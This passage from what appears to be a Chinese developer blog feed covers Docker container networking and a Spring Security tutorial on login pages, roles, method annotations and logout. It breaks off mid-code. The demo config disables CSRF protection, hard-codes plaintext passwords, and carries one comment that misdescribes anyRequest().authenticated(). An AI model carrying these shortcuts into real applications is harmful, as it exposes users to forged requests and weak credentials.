prompt_"># </span><span class="language-bash">1. 使用 --<span class="hljs-built_in">link</span> 链接两个容器</span>docker run -d -P --name tomcat03 --link tomcat02 tomcat<span class="hljs-meta prompt_"># </span><span class="language-bash">2. 两个容器 ping</span>docker exec -it tomcat03 ping tomcat02language-shell复制代码</code></pre><ol><li>inspect</li></ol><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看网卡</span>docker network ls<span class="hljs-meta prompt_"># </span><span class="language-bash">查看具体网卡信息</span>docker network inspect a2a9b68069bclanguage-shell复制代码</code></pre><hr><h3 id="2-4-3-自定义网络"><a href="#2-4-3-自定义网络" class="headerlink" title="2.4.3 自定义网络"></a>2.4.3 自定义网络</h3><ol><li>网络模式</li></ol><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">bridge: 桥接 docker （默认，自定义网络也是使用桥接模式）</span><span class="hljs-meta prompt_"># </span><span class="language-bash">none: 不配置网络</span><span class="hljs-meta prompt_"># </span><span class="language-bash">host: 和宿主机共享网络</span><span class="hljs-meta prompt_"># </span><span class="language-bash">container: 容器网络连通！（用的少，局限性大）</span>language-shell复制代码</code></pre><ol><li>案例</li></ol><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">默认的情况,两者等价</span>docker run -d -P --name tomcat-1 tomcatdocker run -d -P --name tomcat01  --net bridge tomcat<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">docker0特点，默认是docker0网络：域名不能访问, --<span class="hljs-built_in">link</span> 可以打通链接</span><span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 自定义网络： 网络，网关，名称</span>docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">查看网络</span>docker network inspect mynet<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 使用自定义网络mynet</span>docker run -d -P --name tomcat-net-01 --net mynet tomcatdocker run -d -P --name tomcat-net-02 --net mynet tomcat<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">3. 查看网络组成</span> docker network inspect mynet<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">4. 同一个网络内，可以使用容器名进行互ping</span>docker exec -it tomcat-net-01 ping tomcat-net-02<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">5. 实现不同网络间的通信 容器 ping 另一个网络.（原理：一个容器2个IP地址）</span><span class="hljs-meta prompt_"># </span><span class="language-bash">自定义网络 mynet 链接 tomcat01 容器</span>docker network connect mynet tomcat01<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">6. 结论：</span><span class="hljs-meta prompt_"># </span><span class="language-bash">a. 我们自定义的网络docker都已经帮我们维护好了对应的关系，推荐使用自定义网络。</span><span class="hljs-meta prompt_"># </span><span class="language-bash">b. 可以通过划分不同的网络，实现集群间的通信，也更安全</span>language-shell复制代码</code></pre><h3 id="2-4-4-redis-集群"><a href="#2-4-4-redis-集群" class="headerlink" title="2.4.4 redis 集群"></a>2.4.4 redis 集群</h3><hr><h1 id="第三章-实战篇"><a href="#第三章-实战篇" class="headerlink" title="第三章 实战篇"></a>第三章 实战篇</h1><h2 id="3-1-IDEA-整合-Docker"><a href="#3-1-IDEA-整合-Docker" class="headerlink" title="3.1 IDEA 整合 Docker"></a>3.1 IDEA 整合 Docker</h2><h2 id="3-2-Docker-Compose"><a href="#3-2-Docker-Compose" class="headerlink" title="3.2 Docker Compose"></a>3.2 Docker Compose</h2><h2 id="3-3-Docker-Swarm"><a href="#3-3-Docker-Swarm" class="headerlink" title="3.3 Docker Swarm"></a>3.3 Docker Swarm</h2><h2 id="3-4-DI-CD-jenkins"><a href="#3-4-DI-CD-jenkins" class="headerlink" title="3.4 DI\CD jenkins"></a>3.4 DI\CD jenkins</h2><hr><h1 id="第四章-番外篇"><a href="#第四章-番外篇" class="headerlink" title="第四章 番外篇"></a>第四章 番外篇</h1><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SpringSecurity</title>
      <link href="/2021/07/19/SpringSecurity/"/>
      <url>/2021/07/19/SpringSecurity/</url>
      
        <content type="html"><![CDATA[<h3 id="第一章-dome"><a href="#第一章-dome" class="headerlink" title="第一章 dome"></a>第一章 dome</h3><ol><li>pom.xml</li></ol><pre><code class="hljs xml">        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-security<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>language-xml复制代码</code></pre><ol><li>controller</li></ol><pre><code class="hljs kotlin"><span class="hljs-meta">@RestController</span><span class="hljs-meta">@RequestMapping(<span class="hljs-string">&quot;/test&quot;</span>)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;    <span class="hljs-meta">@GetMapping(<span class="hljs-string">&quot;hello&quot;</span>)</span>    <span class="hljs-keyword">public</span> String hello() &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello security&quot;</span>;    &#125;&#125;复制代码</code></pre><ol><li>运行项目即可</li></ol><hr><h3 id="第二章-概念"><a href="#第二章-概念" class="headerlink" title="第二章 概念"></a>第二章 概念</h3><h4 id="2-1-过滤器"><a href="#2-1-过滤器" class="headerlink" title="2.1 过滤器"></a>2.1 过滤器</h4><ol><li>FilterSecurityInterceptor 方法级过滤器</li><li>ExceptionTranslationFilter 异常过滤器</li><li>UsernamePasswordAuthenticationFilter 对&#x2F;login的post请求做拦截，校验表单中用户名，密码。</li></ol><h4 id="2-2-过滤器加载"><a href="#2-2-过滤器加载" class="headerlink" title="2.2 过滤器加载"></a>2.2 过滤器加载</h4><ol><li>加载过程：DelegatingFilterProxy -&gt; initDelegate -&gt; targetBeanName -&gt; FilterChainProxy -&gt; doFilterInternal -&gt; List(存放要加载的过滤器)</li></ol><h4 id="2-3-两个重要接口"><a href="#2-3-两个重要接口" class="headerlink" title="2.3 两个重要接口"></a>2.3 两个重要接口</h4><ol><li>UserDetailsService 接口，查询数据接口</li></ol><ul><li>自定义一个类继承 UsernamePasswordAuthenticationFilter</li><li>重写 attemptAuthentication 方法，得到用户名和密码做校验，查数据库需要单独去写，就需要写到 UserDetailsService接口中。</li><li>重写 successfulAuthentication 方法，验证成功调用该方法</li><li>重写 unsuccessfulAuthentication 方法，验证失败调用该方法</li><li>自定义一个类实现 UserDetailsService接口，编写查询数据过程，返回User对象，这个User对象是安全框架提供的对象</li></ul><ol><li>PasswordEncoder 接口，对用户和密码加密的接口</li></ol><hr><h3 id="第三章-认证和授权"><a href="#第三章-认证和授权" class="headerlink" title="第三章 认证和授权"></a>第三章 认证和授权</h3><h4 id="3-1-认证"><a href="#3-1-认证" class="headerlink" title="3.1 认证"></a>3.1 认证</h4><h4 id="3-1-1-设置用户名和密码-三者选其一"><a href="#3-1-1-设置用户名和密码-三者选其一" class="headerlink" title="3.1.1 设置用户名和密码,三者选其一"></a>3.1.1 设置用户名和密码,三者选其一</h4><ol><li>方法一：配置文件 application.properties</li></ol><pre><code class="hljs properties"><span class="hljs-comment"># 方式一：设置用户名和密码</span><span class="hljs-attr">spring.security.user.name</span>=<span class="hljs-string">admin</span><span class="hljs-attr">spring.security.user.password</span>=<span class="hljs-string">hadoop</span><span class="hljs-attr">language-properties复制代码</span></code></pre><ol><li>方式二：配置类</li></ol><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(AuthenticationManagerBuilder auth)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-comment">// 对密码加密接口，可以不加密</span>        <span class="hljs-type">BCryptPasswordEncoder</span> <span class="hljs-variable">passwordEncoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>();        <span class="hljs-type">String</span> <span class="hljs-variable">passwd</span> <span class="hljs-operator">=</span> passwordEncoder.encode(<span class="hljs-string">&quot;hadoop&quot;</span>);        <span class="hljs-comment">// 设置用户名，密码，角色</span>        auth.inMemoryAuthentication().withUser(<span class="hljs-string">&quot;hjxstart&quot;</span>).password(passwd).roles(<span class="hljs-string">&quot;&quot;</span>);    &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 加密需要用到 PasswordEncoder这个对象</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Bean</span>    PasswordEncoder <span class="hljs-title function_">passwd</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>();    &#125;&#125;language-java复制代码</code></pre><ol><li>方式三：自定义编写实现类 UserDetailsService</li></ol><ul><li>第一步：创建一个配置类，设置使用那个 userDetailsService 实现类；</li><li>第二步：编写实现类，返回User对象，User对象有用户名密码和操作对象</li><li>代码</li></ul><pre><code class="hljs java"><span class="hljs-meta">@Service(&quot;userDetailsService&quot;)</span> <span class="hljs-comment">// 自定义Service名字</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyUserDetailsService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDetailsService</span> &#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> UsersMapper usersMapper;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> UserDetails <span class="hljs-title function_">loadUserByUsername</span><span class="hljs-params">(String s)</span> <span class="hljs-keyword">throws</span> UsernameNotFoundException &#123;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 1.1调用userMapper方法查询数据库，得到 用户名， 密码， 权限</span><span class="hljs-comment">         */</span>        <span class="hljs-comment">// 根据用户名查询数据库</span>        QueryWrapper&lt;Users&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();        wrapper.eq(<span class="hljs-string">&quot;username&quot;</span>, s);        <span class="hljs-type">Users</span> <span class="hljs-variable">users</span> <span class="hljs-operator">=</span> usersMapper.selectOne(wrapper);        <span class="hljs-comment">// 判断:数据库没有用户名，认证失败</span>        <span class="hljs-keyword">if</span> (users == <span class="hljs-literal">null</span>) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UsernameNotFoundException</span>(<span class="hljs-string">&quot;用户名不存在！&quot;</span>);        &#125;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 1.2 返回一个冲数据库查询出来的 User(用户名，密码，权限集合)对象</span><span class="hljs-comment">         */</span>        <span class="hljs-comment">// 定义一个权限列表</span>        List&lt;GrantedAuthority&gt; auths = AuthorityUtils.commaSeparatedStringToAuthorityList(<span class="hljs-string">&quot;role&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(users.getUsername(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>().encode(users.getPassword()), auths);    &#125;&#125;language-java复制代码</code></pre><h4 id="3-2-授权"><a href="#3-2-授权" class="headerlink" title="3.2 授权"></a>3.2 授权</h4><hr><h3 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h3><h4 id="4-1-自定义登录页面-不需要认证也可以访问"><a href="#4-1-自定义登录页面-不需要认证也可以访问" class="headerlink" title="4.1 自定义登录页面 &amp; 不需要认证也可以访问"></a>4.1 自定义登录页面 &amp; 不需要认证也可以访问</h4><ol><li>自定义 config</li></ol><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfigTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-comment">// 登录页面设置.登录访问路径(Controller).登录成功之后跳着的路径</span>        http.formLogin().loginPage(<span class="hljs-string">&quot;/login.html&quot;</span>).loginProcessingUrl(<span class="hljs-string">&quot;/user/login&quot;</span>).defaultSuccessUrl(<span class="hljs-string">&quot;/test/index&quot;</span>).permitAll()                <span class="hljs-comment">// 那些路径需要认证，那些不需要认证才可以访问.访问这些路径可以直接访问不需要认证</span>                .and().authorizeRequests().antMatchers(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;/test/hello&quot;</span>, <span class="hljs-string">&quot;/user/login&quot;</span>).permitAll()                <span class="hljs-comment">// 所有请求都可以访问.关闭csrf防护</span>                .anyRequest().authenticated().and().csrf().disable();    &#125;&#125;language-java复制代码</code></pre><ol><li>static目录下有login.html</li></ol><h4 id="4-2-基于角色或权限进行访问控制"><a href="#4-2-基于角色或权限进行访问控制" class="headerlink" title="4.2 基于角色或权限进行访问控制"></a>4.2 基于角色或权限进行访问控制</h4><ol><li>hasAuthority 方法(单role控制，多个角色就不行)</li></ol><ul><li>如果当前的主体具有指定的权限，则返回 true, 否则返回 false</li><li>步骤一：在配置类设置当前访问地址有那些权限</li></ul><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfigTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-comment">// 登录页面设置.登录访问路径(Controller).登录成功之后跳着的路径</span>        http.formLogin().loginPage(<span class="hljs-string">&quot;/login.html&quot;</span>).loginProcessingUrl(<span class="hljs-string">&quot;/user/login&quot;</span>).defaultSuccessUrl(<span class="hljs-string">&quot;/test/index&quot;</span>).permitAll()                <span class="hljs-comment">// 那些路径需要认证，那些不需要认证才可以访问.访问这些路径可以直接访问不需要认证</span>                .and().authorizeRequests()                    .antMatchers(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;/test/hello&quot;</span>, <span class="hljs-string">&quot;/user/login&quot;</span>).permitAll()                    <span class="hljs-comment">// 当前登录用户，只有具有 admins 权限才可以访问这个路径</span>                    .antMatchers(<span class="hljs-string">&quot;/test/index&quot;</span>).hasAuthority(<span class="hljs-string">&quot;admins&quot;</span>)                    <span class="hljs-comment">// 所有请求都可以访问.关闭csrf防护</span>                    .anyRequest().authenticated()                .and().csrf().disable();    &#125;&#125;language-java复制代码</code></pre><ul><li>步骤二：在UserDetailsService,把返回User对象设置权限</li></ul><pre><code class="hljs java"><span class="hljs-meta">@Service(&quot;userDetailsService&quot;)</span> <span class="hljs-comment">// 自定义Service名字</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyUserDetailsService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDetailsService</span> &#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> UsersMapper usersMapper;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> UserDetails <span class="hljs-title function_">loadUserByUsername</span><span class="hljs-params">(String s)</span> <span class="hljs-keyword">throws</span> UsernameNotFoundException &#123;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 1.1调用userMapper方法查询数据库，得到 用户名， 密码， 权限</span><span class="hljs-comment">         */</span>        <span class="hljs-comment">// 根据用户名查询数据库</span>        QueryWrapper&lt;Users&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();        wrapper.eq(<span class="hljs-string">&quot;username&quot;</span>, s);        <span class="hljs-type">Users</span> <span class="hljs-variable">users</span> <span class="hljs-operator">=</span> usersMapper.selectOne(wrapper);        <span class="hljs-comment">// 判断:数据库没有用户名，认证失败</span>        <span class="hljs-keyword">if</span> (users == <span class="hljs-literal">null</span>) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UsernameNotFoundException</span>(<span class="hljs-string">&quot;用户名不存在！&quot;</span>);        &#125;        <span class="hljs-comment">/**</span><span class="hljs-comment">         * 1.2 返回一个从数据库查询出来的 User(用户名，密码，权限集合)对象</span><span class="hljs-comment">         */</span>        <span class="hljs-comment">// 定义一个权限列表</span>        List&lt;GrantedAuthority&gt; auths = AuthorityUtils.commaSeparatedStringToAuthorityList(<span class="hljs-string">&quot;admins，ROLE_sale&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(users.getUsername(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>().encode(users.getPassword()), auths);    &#125;&#125;language-java复制代码</code></pre><ul><li>没有访问权限提示:(type&#x3D;Forbidden,status&#x3D;403)</li></ul><ol><li>hasAnyAuthority 方法 (多权限，多角色空)</li></ol><ul><li>如果当前的主体有任何提供的角色(给定的作为一个逗号的字符串列表)的话，返回true</li><li>步骤一</li></ul><pre><code class="hljs java"><span class="hljs-comment">// Configuration</span>.antMatchers(<span class="hljs-string">&quot;/test/index&quot;</span>).hasAnyAuthority(<span class="hljs-string">&quot;admins,manager&quot;</span>)language-java复制代码</code></pre><ul><li>步骤二</li></ul><pre><code class="hljs java"><span class="hljs-comment">// Service</span> List&lt;GrantedAuthority&gt; auths = AuthorityUtils.commaSeparatedStringToAuthorityList(<span class="hljs-string">&quot;admins&quot;</span>);language-java复制代码</code></pre><ol><li>hasRole 方法</li></ol><ul><li>如果当前祖逖具有指定的角色，则返回true, 否则出现403</li><li>步骤一</li></ul><pre><code class="hljs java"><span class="hljs-comment">// Configuration</span>.antMatchers(<span class="hljs-string">&quot;/test/index&quot;</span>).hasRole(<span class="hljs-string">&quot;sale&quot;</span>)language-java复制代码</code></pre><ul><li>步骤二</li></ul><pre><code class="hljs java"><span class="hljs-comment">// Service //以ROLE_XXXXX</span>List&lt;GrantedAuthority&gt; auths = AuthorityUtils.commaSeparatedStringToAuthorityList(<span class="hljs-string">&quot;admins，ROLE_sale&quot;</span>);language-java复制代码</code></pre><ol><li>hasAnyRole 方法</li></ol><ul><li>表示用户具备任何一个条件都可以访问</li><li>修改配置文件</li></ul><pre><code class="hljs java"><span class="hljs-comment">// 角色权限控制方法四：hasAnyRole</span>.antMatchers(<span class="hljs-string">&quot;/test/index&quot;</span>).hasAnyRole(<span class="hljs-string">&quot;admins,sale&quot;</span>)language-java复制代码</code></pre><ul><li>给用户添加角色</li></ul><pre><code class="hljs java"><span class="hljs-comment">// 定义一个权限列表</span>List&lt;GrantedAuthority&gt; auths = AuthorityUtils.commaSeparatedStringToAuthorityList(<span class="hljs-string">&quot;ROLE_admins,ROLE_sale&quot;</span>);<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(users.getUsername(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>().encode(users.getPassword()), auths);language-java复制代码</code></pre><h3 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h3><h4 id="5-1-自定义403没有权限访问页面"><a href="#5-1-自定义403没有权限访问页面" class="headerlink" title="5.1 自定义403没有权限访问页面"></a>5.1 自定义403没有权限访问页面</h4><ol><li>在配置类进行配置就可以了</li></ol><pre><code class="hljs java"><span class="hljs-comment">// 配置没有权限访问跳转自定义页面</span>        http.exceptionHandling().accessDeniedPage(<span class="hljs-string">&quot;/unauth.html&quot;</span>);language-java复制代码</code></pre><h3 id="第六章-方法常用注解使用"><a href="#第六章-方法常用注解使用" class="headerlink" title="第六章 方法常用注解使用"></a>第六章 方法常用注解使用</h3><h4 id="6-1-EnableGlobalMethodSecurity-securedEnabled-true-prePostEnable-true"><a href="#6-1-EnableGlobalMethodSecurity-securedEnabled-true-prePostEnable-true" class="headerlink" title="6.1 @EnableGlobalMethodSecurity(securedEnabled &#x3D; true, prePostEnable&#x3D;true)"></a>6.1 @EnableGlobalMethodSecurity(securedEnabled &#x3D; true, prePostEnable&#x3D;true)</h4><ol><li>使用注解先要在启动类里面开启注解功能！</li></ol><h4 id="6-2-Secured-用户具有某个角色，可以访问方法"><a href="#6-2-Secured-用户具有某个角色，可以访问方法" class="headerlink" title="6.2 @Secured 用户具有某个角色，可以访问方法"></a>6.2 @Secured 用户具有某个角色，可以访问方法</h4><ol><li>步骤一：在启动类(配置类)开启注解 @EnableGlobalMethodSecurity(securedEnabled &#x3D; true)</li><li>步骤二：在controller的方法上面使用注解，设置角色</li></ol><pre><code class="hljs java">    <span class="hljs-meta">@Secured(&#123;&quot;ROLE_sale&quot;, &quot;ROLE_manager&quot;&#125;)</span>    <span class="hljs-meta">@GetMapping(&quot;update&quot;)</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello update&quot;</span>;    &#125;language-java复制代码</code></pre><ol><li>步骤三：在config添加角色</li></ol><pre><code class="hljs java">List&lt;GrantedAuthority&gt; auths = AuthorityUtils.commaSeparatedStringToAuthorityList(<span class="hljs-string">&quot;ROLE_admins,ROLE_sale&quot;</span>);language-java复制代码</code></pre><h4 id="6-3-PreAuthorize-方法执行前"><a href="#6-3-PreAuthorize-方法执行前" class="headerlink" title="6.3 @PreAuthorize 方法执行前"></a>6.3 @PreAuthorize 方法执行前</h4><ol><li>@PreAuthorize 注解适合进入方法前的权限验证；</li><li>步骤一：在启动类(配置类)开启注解</li></ol><pre><code class="hljs java"><span class="hljs-meta">@EnableGlobalMethodSecurity(securedEnabled = true, prePostEnabled = true)</span>language-java复制代码</code></pre><ol><li>步骤二：在方法添加注解 @preAuthorize</li></ol><pre><code class="hljs java">    <span class="hljs-meta">@GetMapping(&quot;update&quot;)</span>    <span class="hljs-comment">//@Secured(&#123;&quot;ROLE_sale&quot;,&quot;ROLE_manager&quot;&#125;)</span>    <span class="hljs-meta">@PreAuthorize(&quot;hasAnyAuthority(&#x27;admins&#x27;)&quot;)</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello update&quot;</span>;    &#125;language-java复制代码</code></pre><h4 id="6-4-PostAuthorize-方法执行后-返回值"><a href="#6-4-PostAuthorize-方法执行后-返回值" class="headerlink" title="6.4 @PostAuthorize 方法执行后,返回值"></a>6.4 @PostAuthorize 方法执行后,返回值</h4><ol><li>@PostAuthorize 在方法执行完后验证</li><li>步骤一：在启动类(配置类)添加注解</li></ol><pre><code class="hljs java"><span class="hljs-meta">@EnableGlobalMethodSecurity(securedEnabled = true, prePostEnabled = true)</span>language-java复制代码</code></pre><ol><li>步骤二：在方法添加注解</li></ol><pre><code class="hljs java">    <span class="hljs-meta">@GetMapping(&quot;update&quot;)</span>    <span class="hljs-comment">//@Secured(&#123;&quot;ROLE_sale&quot;,&quot;ROLE_manager&quot;&#125;)</span>    <span class="hljs-comment">//@PreAuthorize(&quot;hasAnyAuthority(&#x27;admins&#x27;)&quot;)</span>    <span class="hljs-comment">//@PostAuthorize(&quot;hasAnyAuthority(&#x27;admins&#x27;)&quot;) // 没有权限也可以执行方法</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;        System.out.println(<span class="hljs-string">&quot;update.........&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello update&quot;</span>;    &#125;language-java复制代码</code></pre><h4 id="6-5-PostFilter-对方法返回数据进行过滤"><a href="#6-5-PostFilter-对方法返回数据进行过滤" class="headerlink" title="6.5 @PostFilter 对方法返回数据进行过滤"></a>6.5 @PostFilter 对方法返回数据进行过滤</h4><ol><li>@PostFilter 权限验证之后对数据进行过滤，留下用户名是admin1的数据</li><li>controller</li></ol><pre><code class="hljs java">    <span class="hljs-meta">@GetMapping(&quot;getAll&quot;)</span>    <span class="hljs-meta">@PreAuthorize(&quot;hasAnyAuthority(&#x27;admins&#x27;)&quot;)</span>    <span class="hljs-meta">@PostFilter(&quot;filterObject.username == &#x27;admin1&#x27;&quot;)</span> <span class="hljs-comment">// 对返回对象的username进行过滤</span>    <span class="hljs-keyword">public</span> List&lt;Users&gt; <span class="hljs-title function_">getAllUser</span><span class="hljs-params">()</span> &#123;        ArrayList&lt;Users&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Users</span>(<span class="hljs-number">11</span>, <span class="hljs-string">&quot;admin1&quot;</span>, <span class="hljs-string">&quot;hadoop&quot;</span>));        list.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Users</span>(<span class="hljs-number">21</span>, <span class="hljs-string">&quot;admin2&quot;</span>, <span class="hljs-string">&quot;hadoop&quot;</span>));        System.out.println(list);        <span class="hljs-keyword">return</span> list;    &#125;language-java复制代码</code></pre><h4 id="6-6-PreFilter-对-方法传入的参数做过滤"><a href="#6-6-PreFilter-对-方法传入的参数做过滤" class="headerlink" title="6.6 @PreFilter 对 方法传入的参数做过滤"></a>6.6 @PreFilter 对 方法传入的参数做过滤</h4><ol><li>@PreFilter 进入控制器之前对数据进行过滤</li><li>在controller中</li></ol><pre><code class="hljs java">    <span class="hljs-meta">@RequestMapping(&quot;getTestPreFilter&quot;)</span>    <span class="hljs-meta">@PreAuthorize(&quot;hasRole(&#x27;ROLE_admins&#x27;)&quot;)</span>    <span class="hljs-meta">@PreFilter(value = &quot;filterObject.id%2==0&quot;)</span>    <span class="hljs-meta">@ResponseBody</span>    <span class="hljs-keyword">public</span> List&lt;Users&gt; <span class="hljs-title function_">getTestPreFilter</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> List&lt;Users&gt; list)</span> &#123;        list.forEach(t -&gt; &#123;            System.out.println(t.getId() + <span class="hljs-string">&quot;\t&quot;</span> + t.getUsername());        &#125;);        <span class="hljs-keyword">return</span> list;    &#125;language-java复制代码</code></pre><h3 id="第7章-用户注销"><a href="#第7章-用户注销" class="headerlink" title="第7章 用户注销"></a>第7章 用户注销</h3><h4 id="用户注销"><a href="#用户注销" class="headerlink" title="用户注销"></a>用户注销</h4><ol><li>在配置类中添加退出映射地址</li></ol><pre><code class="hljs java"><span class="hljs-comment">// 退出，注销配置, 退出地址，退出后的跳转地址</span>        http.logout().logoutUrl(<span class="hljs-string">&quot;/logout&quot;</span>).logoutSuccessUrl(<span class="hljs-string">&quot;/test/hello&quot;</span>).permitAll();language-java复制代码</code></pre><ol><li>在成功页面添加超链接，写设置退出路径 success.html</li></ol><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>登录成功！<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/logout&quot;</span>&gt;</span>退出<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>language-html复制代码</code></pre><ol><li>登录成功之后，在成功页面点击退出，再去访问其他controller不能进行访问的</li></ol><pre><code class="hljs java">        http.formLogin()                .loginPage(<span class="hljs-string">&quot;/login.html&quot;</span>)                .loginProcessingUrl(<span class="hljs-string">&quot;/user/login&quot;</span>)                .defaultSuccessUrl(<span class="hljs-string">&quot;/success.html&quot;</span>).permitAll()language-java复制代码</code></pre><h3 id="第8章-自动登录-RemeberMeService"><a href="#第8章-自动登录-RemeberMeService" class="headerlink" title="第8章 自动登录 RemeberMeService"></a>第8章 自动登录 RemeberMeService</h3><h4 id="8-1-原理"><a href="#8-1-原理" class="headerlink" title="8.1 原理"></a>8.1 原理</h4><h4 id="8-2-实现"><a href="#8-2-实现" class="headerlink" title="8.2 实现"></a>8.2 实现</h4><ol><li>创建表(可选)</li><li>配置类，注入数据源，配置操作数据库对象</li></ol><pre><code class="hljs java">    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 自动登录第二步:2.1</span><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> auth</span><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> DataSource dataSource;    <span class="hljs-comment">/**</span><span class="hljs-comment">     * 自动登录第二步:2.2</span><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><span class="hljs-comment">     */</span>    <span class="hljs-meta">@Bean</span>    <span class="hljs-keyword">public</span> PersistentTokenRepository <span 